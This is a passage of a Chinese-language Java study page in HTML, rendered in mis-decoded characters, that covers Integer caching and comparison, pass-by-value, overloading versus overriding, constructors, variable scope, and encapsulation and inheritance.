<p>Java é‡Œä½¿ç”¨ long ç±»å‹çš„æ•°æ®ä¸€å®šè¦åœ¨æ•°å€¼åé¢åŠ ä¸Š <strong>L</strong>ï¼Œå¦åˆ™å°†ä½œä¸ºæ•´å‹è§£æ</p>
<p>Java åŸºæœ¬ç±»å‹çš„åŒ…è£…ç±»çš„å¤§éƒ¨åˆ†éƒ½å®ç°äº†å¸¸é‡æ± æŠ€æœ¯ï¼Œå³ Byte,Short,Integer,Long:é»˜è®¤åˆ›å»ºäº†æ•°å€¼[-128ï¼Œ127] çš„ç›¸åº”ç±»å‹çš„ç¼“å­˜æ•°æ®ï¼ŒCharacter åˆ›å»ºäº†æ•°å€¼åœ¨[0,127]èŒƒå›´çš„ç¼“å­˜æ•°æ®ï¼ŒBoolean ç›´æ¥è¿”å› True Or False</p>
<p><strong>Integerä¸€ä¸ªä¾‹å­:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">40</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">40</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">40</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">40</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;i1=i2   &quot;</span> + (i1 == i2));</span><br><span class="line">System.out.println(<span class="string">&quot;i1=i2+i3   &quot;</span> + (i1 == i2 + i3));</span><br><span class="line">System.out.println(<span class="string">&quot;i1=i4   &quot;</span> + (i1 == i4));</span><br><span class="line">System.out.println(<span class="string">&quot;i4=i5   &quot;</span> + (i4 == i5));</span><br><span class="line">System.out.println(<span class="string">&quot;i4=i5+i6   &quot;</span> + (i4 == i5 + i6));</span><br><span class="line">System.out.println(<span class="string">&quot;40=i5+i6   &quot;</span> + (<span class="number">40</span> == i5 + i6));</span><br></pre></td></tr></table></figure>

<p>ç»“æœï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i1=i2   true</span><br><span class="line">i1=i2+i3   true</span><br><span class="line">i1=i4   false</span><br><span class="line">i4=i5   false</span><br><span class="line">i4=i5+i6   true</span><br><span class="line">40=i5+i6   true</span><br></pre></td></tr></table></figure>

<p>è§£é‡Šï¼š</p>
<p>è¯­å¥ i4 &#x3D;&#x3D; i5 + i6ï¼Œå› ä¸º+è¿™ä¸ªæ“ä½œç¬¦ä¸é€‚ç”¨äº Integer å¯¹è±¡ï¼Œé¦–å…ˆ i5 å’Œ i6 è¿›è¡Œè‡ªåŠ¨æ‹†ç®±æ“ä½œï¼Œè¿›è¡Œæ•°å€¼ç›¸åŠ ï¼Œå³ i4 &#x3D;&#x3D; 40ã€‚ç„¶å Integer å¯¹è±¡æ— æ³•ä¸æ•°å€¼è¿›è¡Œç›´æ¥æ¯”è¾ƒï¼Œæ‰€ä»¥ i4 è‡ªåŠ¨æ‹†ç®±è½¬ä¸º int å€¼ 40ï¼Œæœ€ç»ˆè¿™æ¡è¯­å¥è½¬ä¸º 40 &#x3D;&#x3D; 40 è¿›è¡Œæ•°å€¼æ¯”è¾ƒã€‚</p>
<h4 id="Javaå€¼ä¼ é€’"><a href="#Javaå€¼ä¼ é€’" class="headerlink" title="Javaå€¼ä¼ é€’?"></a>Javaå€¼ä¼ é€’?</h4><p>Java ç¨‹åºè®¾è®¡è¯­è¨€æ€»æ˜¯é‡‡ç”¨æŒ‰å€¼è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–¹æ³•å¾—åˆ°çš„æ˜¯æ‰€æœ‰å‚æ•°å€¼çš„ä¸€ä¸ªæ‹·è´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ–¹æ³•ä¸èƒ½ä¿®æ”¹ä¼ é€’ç»™å®ƒçš„ä»»ä½•å‚æ•°å˜é‡çš„å†…å®¹ã€‚</p>
<h4 id="é‡è½½å’Œé‡å†™çš„åŒºåˆ«"><a href="#é‡è½½å’Œé‡å†™çš„åŒºåˆ«" class="headerlink" title="é‡è½½å’Œé‡å†™çš„åŒºåˆ«"></a>é‡è½½å’Œé‡å†™çš„åŒºåˆ«</h4><p>é‡å†™å‘ç”Ÿåœ¨è¿è¡ŒæœŸï¼Œæ˜¯å­ç±»å¯¹çˆ¶ç±»çš„å…è®¸è®¿é—®çš„æ–¹æ³•çš„å®ç°è¿‡ç¨‹è¿›è¡Œé‡æ–°ç¼–å†™ã€‚</p>
<ol>
<li>è¿”å›å€¼ç±»å‹ã€æ–¹æ³•åã€å‚æ•°åˆ—è¡¨å¿…é¡»ç›¸åŒï¼ŒæŠ›å‡ºçš„å¼‚å¸¸èŒƒå›´å°äºç­‰äºçˆ¶ç±»ï¼Œè®¿é—®ä¿®é¥°ç¬¦èŒƒå›´å¤§äºç­‰äºçˆ¶ç±»ã€‚</li>
<li>å¦‚æœçˆ¶ç±»æ–¹æ³•è®¿é—®ä¿®é¥°ç¬¦ä¸º private&#x2F;final&#x2F;static åˆ™å­ç±»å°±ä¸èƒ½é‡å†™è¯¥æ–¹æ³•ï¼Œä½†æ˜¯è¢« static ä¿®é¥°çš„æ–¹æ³•èƒ½å¤Ÿè¢«å†æ¬¡å£°æ˜ã€‚</li>
<li>æ„é€ æ–¹æ³•æ— æ³•è¢«é‡å†™</li>
</ol>
<p>ç»¼ä¸Šï¼šé‡å†™å°±æ˜¯å­ç±»å¯¹çˆ¶ç±»æ–¹æ³•çš„é‡æ–°æ”¹é€ ï¼Œå¤–éƒ¨æ ·å­ä¸èƒ½æ”¹å˜ï¼Œå†…éƒ¨é€»è¾‘å¯ä»¥æ”¹å˜</p>
<table>
<thead>
<tr>
<th>åŒºåˆ«ç‚¹</th>
<th>é‡è½½æ–¹æ³•</th>
<th>é‡å†™æ–¹æ³•</th>
</tr>
</thead>
<tbody><tr>
<td>å‘ç”ŸèŒƒå›´</td>
<td>åŒä¸€ä¸ªç±»</td>
<td>å­ç±»</td>
</tr>
<tr>
<td>å‚æ•°åˆ—è¡¨</td>
<td><strong>å¿…é¡»ä¿®æ”¹</strong></td>
<td>ä¸€å®šä¸èƒ½ä¿®æ”¹</td>
</tr>
<tr>
<td>è¿”å›ç±»å‹</td>
<td>å¯ä¿®æ”¹</td>
<td>å­ç±»æ–¹æ³•è¿”å›å€¼ç±»å‹åº”æ¯”çˆ¶ç±»æ–¹æ³•è¿”å›å€¼ç±»å‹æ›´å°æˆ–ç›¸ç­‰</td>
</tr>
<tr>
<td>å¼‚å¸¸</td>
<td>å¯ä¿®æ”¹</td>
<td>å­ç±»æ–¹æ³•å£°æ˜æŠ›å‡ºçš„å¼‚å¸¸ç±»åº”æ¯”çˆ¶ç±»æ–¹æ³•å£°æ˜æŠ›å‡ºçš„å¼‚å¸¸ç±»æ›´å°æˆ–ç›¸ç­‰ï¼›</td>
</tr>
<tr>
<td>è®¿é—®ä¿®é¥°ç¬¦</td>
<td>å¯ä¿®æ”¹</td>
<td>ä¸€å®šä¸èƒ½åšæ›´ä¸¥æ ¼çš„é™åˆ¶ï¼ˆå¯ä»¥é™ä½é™åˆ¶ï¼‰</td>
</tr>
<tr>
<td>å‘ç”Ÿé˜¶æ®µ</td>
<td>ç¼–è¯‘æœŸ</td>
<td>è¿è¡ŒæœŸ</td>
</tr>
</tbody></table>
<p><strong>æ–¹æ³•çš„é‡å†™è¦éµå¾ªâ€œä¸¤åŒä¸¤å°ä¸€å¤§â€</strong></p>
<ul>
<li>â€œä¸¤åŒâ€å³æ–¹æ³•åç›¸åŒã€å½¢å‚åˆ—è¡¨ç›¸åŒï¼›</li>
<li>â€œä¸¤å°â€æŒ‡çš„æ˜¯å­ç±»æ–¹æ³•è¿”å›å€¼ç±»å‹åº”æ¯”çˆ¶ç±»æ–¹æ³•è¿”å›å€¼ç±»å‹æ›´å°æˆ–ç›¸ç­‰ï¼Œå­ç±»æ–¹æ³•å£°æ˜æŠ›å‡ºçš„å¼‚å¸¸ç±»åº”æ¯”çˆ¶ç±»æ–¹æ³•å£°æ˜æŠ›å‡ºçš„å¼‚å¸¸ç±»æ›´å°æˆ–ç›¸ç­‰ï¼›</li>
<li>â€œä¸€å¤§â€æŒ‡çš„æ˜¯å­ç±»æ–¹æ³•çš„è®¿é—®æƒé™åº”æ¯”çˆ¶ç±»æ–¹æ³•çš„è®¿é—®æƒé™æ›´å¤§æˆ–ç›¸ç­‰ã€‚</li>
</ul>
<p>â­ï¸ <strong>é‡å†™çš„è¿”å›å€¼ç±»</strong>å‹ï¼šå¦‚æœæ–¹æ³•çš„è¿”å›ç±»å‹æ˜¯voidå’ŒåŸºæœ¬æ•°æ®ç±»å‹ï¼Œåˆ™è¿”å›å€¼é‡å†™æ—¶ä¸å¯ä¿®æ”¹ã€‚ä½†æ˜¯å¦‚æœæ–¹æ³•çš„è¿”å›å€¼æ˜¯å¼•ç”¨ç±»å‹ï¼Œé‡å†™æ—¶æ˜¯å¯ä»¥è¿”å›è¯¥å¼•ç”¨ç±»å‹çš„å­ç±»çš„ã€‚</p>
<h4 id="é¢å‘å¯¹è±¡å’Œé¢å‘è¿‡ç¨‹çš„åŒºåˆ«"><a href="#é¢å‘å¯¹è±¡å’Œé¢å‘è¿‡ç¨‹çš„åŒºåˆ«" class="headerlink" title="é¢å‘å¯¹è±¡å’Œé¢å‘è¿‡ç¨‹çš„åŒºåˆ«"></a>é¢å‘å¯¹è±¡å’Œé¢å‘è¿‡ç¨‹çš„åŒºåˆ«</h4><ul>
<li>é¢å‘è¿‡ç¨‹ ï¼šæ€§èƒ½é«˜ã€‚ å› ä¸ºç±»è°ƒç”¨æ—¶éœ€è¦å®ä¾‹åŒ–ï¼Œå¼€é”€æ¯”è¾ƒå¤§ï¼Œæ¯”è¾ƒæ¶ˆè€—èµ„æºï¼Œæ‰€ä»¥å½“æ€§èƒ½æ˜¯æœ€é‡è¦çš„è€ƒé‡å› ç´ çš„æ—¶å€™ï¼Œæ¯”å¦‚å•ç‰‡æœºã€åµŒå…¥å¼å¼€å‘ã€Linux&#x2F;Unix ç­‰ä¸€èˆ¬é‡‡ç”¨é¢å‘è¿‡ç¨‹å¼€å‘ã€‚ä½†æ˜¯ï¼Œé¢å‘è¿‡ç¨‹æ²¡æœ‰é¢å‘å¯¹è±¡æ˜“ç»´æŠ¤ã€æ˜“å¤ç”¨ã€æ˜“æ‰©å±•ã€‚</li>
<li>é¢å‘å¯¹è±¡ ï¼šæ˜“ç»´æŠ¤ã€æ˜“å¤ç”¨ã€æ˜“æ‰©å±•ã€‚ å› ä¸ºé¢å‘å¯¹è±¡æœ‰å°è£…ã€ç»§æ‰¿ã€å¤šæ€æ€§çš„ç‰¹æ€§ï¼Œæ‰€ä»¥å¯ä»¥è®¾è®¡å‡ºä½è€¦åˆçš„ç³»ç»Ÿï¼Œä½¿ç³»ç»Ÿæ›´åŠ çµæ´»ã€æ›´åŠ æ˜“äºç»´æŠ¤ã€‚ä½†æ˜¯ï¼Œé¢å‘å¯¹è±¡æ€§èƒ½æ¯”é¢å‘è¿‡ç¨‹ä½ã€‚</li>
</ul>
<h4 id="æ„é€ å™¨æ˜¯å¦å¯è¢«é‡å†™"><a href="#æ„é€ å™¨æ˜¯å¦å¯è¢«é‡å†™" class="headerlink" title="æ„é€ å™¨æ˜¯å¦å¯è¢«é‡å†™?"></a>æ„é€ å™¨æ˜¯å¦å¯è¢«é‡å†™?</h4><p>Constructor ä¸èƒ½è¢« overrideï¼ˆé‡å†™ï¼‰,ä½†æ˜¯å¯ä»¥ overloadï¼ˆé‡è½½ï¼‰,æ‰€ä»¥ä½ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç±»ä¸­æœ‰å¤šä¸ªæ„é€ å‡½æ•°çš„æƒ…å†µã€‚</p>
<h4 id="åœ¨javaä¸­å®šä¹‰ä¸€ä¸ªä¸åšäº‹ä¸”æ²¡æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•çš„ä½œç”¨"><a href="#åœ¨javaä¸­å®šä¹‰ä¸€ä¸ªä¸åšäº‹ä¸”æ²¡æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•çš„ä½œç”¨" class="headerlink" title="åœ¨javaä¸­å®šä¹‰ä¸€ä¸ªä¸åšäº‹ä¸”æ²¡æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•çš„ä½œç”¨"></a>åœ¨javaä¸­å®šä¹‰ä¸€ä¸ªä¸åšäº‹ä¸”æ²¡æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•çš„ä½œç”¨</h4><p>Java ç¨‹åºåœ¨æ‰§è¡Œå­ç±»çš„æ„é€ æ–¹æ³•ä¹‹å‰ï¼Œå¦‚æœæ²¡æœ‰ç”¨ super()æ¥è°ƒç”¨çˆ¶ç±»ç‰¹å®šçš„æ„é€ æ–¹æ³•ï¼Œåˆ™ä¼šè°ƒç”¨çˆ¶ç±»ä¸­â€œæ²¡æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•â€ã€‚å› æ­¤ï¼Œå¦‚æœçˆ¶ç±»ä¸­åªå®šä¹‰äº†æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•ï¼Œè€Œåœ¨å­ç±»çš„æ„é€ æ–¹æ³•ä¸­åˆæ²¡æœ‰ç”¨ super()æ¥è°ƒç”¨çˆ¶ç±»ä¸­ç‰¹å®šçš„æ„é€ æ–¹æ³•ï¼Œåˆ™ç¼–è¯‘æ—¶å°†å‘ç”Ÿé”™è¯¯ï¼Œå› ä¸º Java ç¨‹åºåœ¨çˆ¶ç±»ä¸­æ‰¾ä¸åˆ°æ²¡æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•å¯ä¾›æ‰§è¡Œã€‚è§£å†³åŠæ³•æ˜¯åœ¨çˆ¶ç±»é‡ŒåŠ ä¸Šä¸€ä¸ªä¸åšäº‹ä¸”æ²¡æœ‰å‚æ•°çš„æ„é€ æ–¹æ³•ã€‚å¸®åŠ©å­ç±»åšåˆå§‹åŒ–å·¥ä½œã€‚</p>
<p>å¦‚æœåœ¨ç±»ä¸­ä½ æä¾›äº†å…¶ä»–æœ‰å‚çš„æ„é€ å™¨ï¼Œåˆ™ç¼–è¯‘å™¨ä¸ä¼šæä¾›é»˜è®¤çš„æ— å‚æ„é€ å™¨ã€‚</p>
<p>å¦‚æœåœ¨ç±»ä¸­ä½ æ²¡æœ‰æä¾›ä»»ä½•æ„é€ å™¨ï¼Œåˆ™ç¼–è¯‘å™¨ä¼šæä¾›ä¸€ä¸ªé»˜è®¤çš„æ— å‚æ„é€ å™¨ã€‚</p>
<p>å¦‚æœä½ æä¾›äº†ä¸€ä¸ªæ„é€ å™¨ï¼Œä½ æ— é¡»æ‰‹åŠ¨æ·»åŠ super()åˆ°ä½ çš„æ„é€ å™¨ï¼Œç¼–è¯‘å™¨ä¼šé»˜è®¤æ·»åŠ ã€‚</p>
<p>å¦‚æœçˆ¶ç±»æœªæä¾›æ— å‚æ„é€ å™¨ï¼Œä¸”å­ç±»æ²¡æœ‰ä½¿ç”¨super()è°ƒç”¨çˆ¶ç±»æœ‰å‚æ„é€ çš„è¯ç¼–è¯‘å™¨ä¼šæŠ¥é”™; </p>
<p>å¦‚æœæ„é€ å™¨ä¸­æ·»åŠ äº†thiså¼•ç”¨è¯¥ç±»çš„å…¶ä»–æ„é€ å™¨ï¼Œæˆ–è€…æ·»åŠ äº†super()è°ƒç”¨çˆ¶ç±»æ„é€ å™¨ï¼Œthiså’Œsuperå¿…é¡»åœ¨æ„é€ å™¨ç¬¬ä¸€è¡Œï¼Œthiså¼•ç”¨å…¶ä»–æ„é€ å™¨å’Œsuper()è¯­å¥ä¸ä¼šåŒæ—¶å‡ºç°</p>
<h4 id="ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•çš„ä½œç”¨æ˜¯ä»€ä¹ˆ-è‹¥ä¸€ä¸ªç±»æ²¡æœ‰å£°æ˜æ„é€ æ–¹æ³•ï¼Œè¯¥ç¨‹åºèƒ½æ­£ç¡®æ‰§è¡Œå—-ä¸ºä»€ä¹ˆ"><a href="#ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•çš„ä½œç”¨æ˜¯ä»€ä¹ˆ-è‹¥ä¸€ä¸ªç±»æ²¡æœ‰å£°æ˜æ„é€ æ–¹æ³•ï¼Œè¯¥ç¨‹åºèƒ½æ­£ç¡®æ‰§è¡Œå—-ä¸ºä»€ä¹ˆ" class="headerlink" title="ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•çš„ä½œç”¨æ˜¯ä»€ä¹ˆ? è‹¥ä¸€ä¸ªç±»æ²¡æœ‰å£°æ˜æ„é€ æ–¹æ³•ï¼Œè¯¥ç¨‹åºèƒ½æ­£ç¡®æ‰§è¡Œå—? ä¸ºä»€ä¹ˆ?"></a>ä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•çš„ä½œç”¨æ˜¯ä»€ä¹ˆ? è‹¥ä¸€ä¸ªç±»æ²¡æœ‰å£°æ˜æ„é€ æ–¹æ³•ï¼Œè¯¥ç¨‹åºèƒ½æ­£ç¡®æ‰§è¡Œå—? ä¸ºä»€ä¹ˆ?</h4><p>ä¸»è¦ä½œç”¨æ˜¯å®Œæˆå¯¹ç±»å¯¹è±¡çš„åˆå§‹åŒ–å·¥ä½œã€‚</p>
<p>å¯ä»¥æ‰§è¡Œã€‚å› ä¸ºä¸€ä¸ªç±»å³ä½¿æ²¡æœ‰å£°æ˜æ„é€ æ–¹æ³•ä¹Ÿä¼šæœ‰é»˜è®¤çš„ä¸å¸¦å‚æ•°çš„æ„é€ æ–¹æ³•ã€‚å¦‚æœæˆ‘ä»¬è‡ªå·±æ·»åŠ äº†ç±»çš„æ„é€ æ–¹æ³•ï¼ˆæ— è®ºæ˜¯å¦æœ‰å‚ï¼‰ï¼ŒJava å°±ä¸ä¼šå†æ·»åŠ é»˜è®¤çš„æ— å‚æ•°çš„æ„é€ æ–¹æ³•äº†ï¼Œè¿™æ—¶å€™ï¼Œå°±ä¸èƒ½ç›´æ¥ new ä¸€ä¸ªå¯¹è±¡è€Œä¸ä¼ é€’å‚æ•°äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€ç›´åœ¨ä¸çŸ¥ä¸è§‰åœ°ä½¿ç”¨æ„é€ æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™åé¢è¦åŠ ä¸€ä¸ªæ‹¬å·ï¼ˆå› ä¸ºè¦è°ƒç”¨æ— å‚çš„æ„é€ æ–¹æ³•ï¼‰ã€‚å¦‚æœæˆ‘ä»¬é‡è½½äº†æœ‰å‚çš„æ„é€ æ–¹æ³•ï¼Œè®°å¾—éƒ½è¦æŠŠæ— å‚çš„æ„é€ æ–¹æ³•ä¹Ÿå†™å‡ºæ¥ï¼ˆæ— è®ºæ˜¯å¦ç”¨åˆ°ï¼‰ï¼Œå› ä¸ºè¿™å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™å°‘è¸©å‘ã€‚</p>
<p>æ„é€ æ–¹æ³•:</p>
<ol>
<li>åå­—ä¸ç±»åç›¸åŒã€‚</li>
<li>æ²¡æœ‰è¿”å›å€¼ï¼Œä½†ä¸èƒ½ç”¨ void å£°æ˜æ„é€ å‡½æ•°ã€‚</li>
<li>ç”Ÿæˆç±»çš„å¯¹è±¡æ—¶è‡ªåŠ¨æ‰§è¡Œï¼Œæ— éœ€è°ƒç”¨ã€‚</li>
</ol>
<h4 id="æˆå‘˜å˜é‡å’Œå±€éƒ¨å˜é‡"><a href="#æˆå‘˜å˜é‡å’Œå±€éƒ¨å˜é‡" class="headerlink" title="æˆå‘˜å˜é‡å’Œå±€éƒ¨å˜é‡"></a>æˆå‘˜å˜é‡å’Œå±€éƒ¨å˜é‡</h4><ol>
<li><p>è¯­æ³•å½¢å¼ä¸Š: æˆå‘˜å˜é‡æ˜¯å±äºç±»çš„ï¼Œè€Œå±€éƒ¨å˜é‡æ˜¯åœ¨ä»£ç å—æˆ–æ–¹æ³•ä¸­å®šä¹‰çš„å˜é‡æˆ–æ˜¯æ–¹æ³•çš„å‚æ•°ï¼›æˆå‘˜å˜é‡å¯ä»¥è¢« public,private,static ç­‰ä¿®é¥°ç¬¦æ‰€ä¿®é¥°ï¼Œè€Œå±€éƒ¨å˜é‡ä¸èƒ½è¢«è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦åŠ static æ‰€ä¿®é¥°ï¼›ä½†æ˜¯ï¼Œæˆå‘˜å˜é‡å’Œå±€éƒ¨å˜é‡éƒ½èƒ½è¢« final æ‰€ä¿®é¥°ã€‚</p>
</li>
<li><p>ä»å˜é‡åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ–¹å¼æ¥çœ‹: å¦‚æœæˆå‘˜å˜é‡æ˜¯ä½¿ç”¨staticä¿®é¥°çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªæˆå‘˜å˜é‡æ˜¯å±äºç±»çš„ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨staticä¿®é¥°ï¼Œè¿™ä¸ªæˆå‘˜å˜é‡æ˜¯å±äºå®ä¾‹çš„ã€‚è€Œå¯¹è±¡å­˜åœ¨äºå †å†…å­˜ï¼Œå±€éƒ¨å˜é‡åˆ™å­˜åœ¨äºæ ˆå†…å­˜ã€‚</p>
</li>
<li><p>ä»å˜é‡åœ¨å†…å­˜ä¸­çš„ç”Ÿå­˜æ—¶é—´ä¸Šçœ‹:æˆå‘˜å˜é‡æ˜¯å¯¹è±¡çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒéšç€å¯¹è±¡çš„åˆ›å»ºè€Œå­˜åœ¨ï¼Œè€Œå±€éƒ¨å˜é‡éšç€æ–¹æ³•çš„è°ƒç”¨è€Œè‡ªåŠ¨æ¶ˆå¤±ã€‚</p>
</li>
<li><p>æˆå‘˜å˜é‡å¦‚æœæ²¡æœ‰è¢«èµ‹åˆå€¼:åˆ™ä¼šè‡ªåŠ¨ä»¥ç±»å‹çš„é»˜è®¤å€¼è€Œèµ‹å€¼ï¼ˆä¸€ç§æƒ…å†µä¾‹å¤–:è¢« final ä¿®é¥°çš„æˆå‘˜å˜é‡ä¹Ÿå¿…é¡»æ˜¾å¼åœ°èµ‹å€¼ï¼‰ï¼Œè€Œå±€éƒ¨å˜é‡åˆ™ä¸ä¼šè‡ªåŠ¨èµ‹å€¼</p>
</li>
<li><p>æˆå‘˜å˜é‡ï¼ˆå…¨å±€å˜é‡ï¼‰æ˜¯å¯ä»¥ä¸ç»åˆå§‹åŒ–çš„ï¼Œåœ¨ç±»åŠ è½½è¿‡ç¨‹çš„å‡†å¤‡é˜¶æ®µå³å¯ç»™å®ƒèµ‹äºˆé»˜è®¤å€¼ï¼Œä½†å±€éƒ¨å˜é‡ä½¿ç”¨å‰éœ€è¦æ˜¾ç¤ºèµ‹äºˆåˆå§‹å€¼ï¼Œjavacä¸æ˜¯æ¨æ–­ä¸å‡ºä¸å¯ä»¥è¿™æ ·åšï¼Œè€Œæ˜¯æ²¡æœ‰è¿™ä¹ˆåšï¼Œå¯¹äºæˆå‘˜å˜é‡è€Œè¨€ï¼Œå…¶èµ‹å€¼å’Œå–å€¼è®¿é—®çš„å…ˆåé¡ºåºå…·æœ‰ä¸ç¡®å®šæ€§ï¼Œå¯¹äºæˆå‘˜å˜é‡å¯ä»¥åœ¨ä¸€ä¸ªæ–¹æ³•è°ƒç”¨å‰èµ‹å€¼ï¼Œä¹Ÿå¯ä»¥åœ¨æ–¹æ³•è°ƒç”¨åè¿›è¡Œï¼Œè¿™æ˜¯è¿è¡Œæ—¶å‘ç”Ÿçš„ï¼Œç¼–è¯‘å™¨ç¡®å®šä¸äº†ï¼Œäº¤ç»™jvmå»åšæ¯”è¾ƒåˆé€‚ã€‚</p>
</li>
<li><p>è€Œå¯¹äºå±€éƒ¨å˜é‡è€Œè¨€ï¼Œå…¶èµ‹å€¼å’Œå–å€¼è®¿é—®é¡ºåºæ˜¯ç¡®å®šçš„ã€‚è¿™æ ·è®¾è®¡æ˜¯ä¸€ç§çº¦æŸï¼Œå°½æœ€å¤§ç¨‹åº¦å‡å°‘ä½¿ç”¨è€…çŠ¯é”™çš„å¯èƒ½ã€‚å‡ä½¿å±€éƒ¨å˜é‡å¯ä»¥ä½¿ç”¨é»˜è®¤å€¼ï¼Œå¯èƒ½æ€»ä¼šæ— æ„é—´å¿˜è®°èµ‹å€¼ï¼Œè¿›è€Œå¯¼è‡´ä¸å¯é¢„æœŸçš„æƒ…å†µå‡ºç°ã€‚</p>
</li>
</ol>
<h4 id="é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹å¾"><a href="#é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹å¾" class="headerlink" title="é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹å¾"></a>é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹å¾</h4><h4 id="å°è£…"><a href="#å°è£…" class="headerlink" title="å°è£…"></a>å°è£…</h4><p>å°è£…æ˜¯æŒ‡æŠŠä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯ï¼ˆä¹Ÿå°±æ˜¯å±æ€§ï¼‰éšè—åœ¨å¯¹è±¡å†…éƒ¨ï¼Œä¸å…è®¸å¤–éƒ¨å¯¹è±¡ç›´æ¥è®¿é—®å¯¹è±¡çš„å†…éƒ¨ä¿¡æ¯ã€‚ä½†æ˜¯å¯ä»¥æä¾›ä¸€äº›å¯ä»¥è¢«å¤–ç•Œè®¿é—®çš„æ–¹æ³•æ¥æ“ä½œå±æ€§ã€‚å°±å¥½åƒæˆ‘ä»¬çœ‹ä¸åˆ°æŒ‚åœ¨å¢™ä¸Šçš„ç©ºè°ƒçš„å†…éƒ¨çš„é›¶ä»¶ä¿¡æ¯ï¼ˆä¹Ÿå°±æ˜¯å±æ€§ï¼‰ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡é¥æ§å™¨ï¼ˆæ–¹æ³•ï¼‰æ¥æ§åˆ¶ç©ºè°ƒã€‚å¦‚æœå±æ€§ä¸æƒ³è¢«å¤–ç•Œè®¿é—®ï¼Œæˆ‘ä»¬å¤§å¯ä¸å¿…æä¾›æ–¹æ³•ç»™å¤–ç•Œè®¿é—®ã€‚ä½†æ˜¯å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æä¾›ç»™å¤–ç•Œè®¿é—®çš„æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ„ä¹‰äº†ã€‚å°±å¥½åƒå¦‚æœæ²¡æœ‰ç©ºè°ƒé¥æ§å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ— æ³•æ“æ§ç©ºå‡‹åˆ¶å†·ï¼Œç©ºè°ƒæœ¬èº«å°±æ²¡æœ‰æ„ä¹‰äº†ï¼ˆå½“ç„¶ç°åœ¨è¿˜æœ‰å¾ˆå¤šå…¶ä»–æ–¹æ³• ï¼Œè¿™é‡Œåªæ˜¯ä¸ºäº†ä¸¾ä¾‹å­ï¼‰ã€‚</p>
<h4 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h4><p>ä¸åŒç±»å‹çš„å¯¹è±¡ï¼Œç›¸äº’ä¹‹é—´ç»å¸¸æœ‰ä¸€å®šæ•°é‡çš„å…±åŒç‚¹ã€‚ä¾‹å¦‚ï¼Œå°æ˜åŒå­¦ã€å°çº¢åŒå­¦ã€å°æåŒå­¦ï¼Œéƒ½å…±äº«å­¦ç”Ÿçš„ç‰¹æ€§ï¼ˆç­çº§ã€å­¦å·ç­‰ï¼‰ã€‚åŒæ—¶ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡è¿˜å®šä¹‰äº†é¢å¤–çš„ç‰¹æ€§ä½¿å¾—ä»–ä»¬ä¸ä¼—ä¸åŒã€‚ä¾‹å¦‚å°æ˜çš„æ•°å­¦æ¯”è¾ƒå¥½ï¼Œå°çº¢çš„æ€§æ ¼æƒ¹äººå–œçˆ±ï¼›å°æçš„åŠ›æ°”æ¯”è¾ƒå¤§ã€‚ç»§æ‰¿æ˜¯ä½¿ç”¨å·²å­˜åœ¨çš„ç±»çš„å®šä¹‰ä½œä¸ºåŸºç¡€å»ºç«‹æ–°ç±»çš„æŠ€æœ¯ï¼Œæ–°ç±»çš„å®šä¹‰å¯ä»¥å¢åŠ æ–°çš„æ•°æ®æˆ–æ–°çš„åŠŸèƒ½ï¼Œä¹Ÿå¯ä»¥ç”¨çˆ¶ç±»çš„åŠŸèƒ½ï¼Œä½†ä¸èƒ½é€‰æ‹©æ€§åœ°ç»§æ‰¿çˆ¶ç±»ã€‚é€šè¿‡ä½¿ç”¨ç»§æ‰¿ï¼Œå¯ä»¥å¿«é€Ÿåœ°åˆ›å»ºæ–°çš„ç±»ï¼Œå¯ä»¥æé«˜ä»£ç 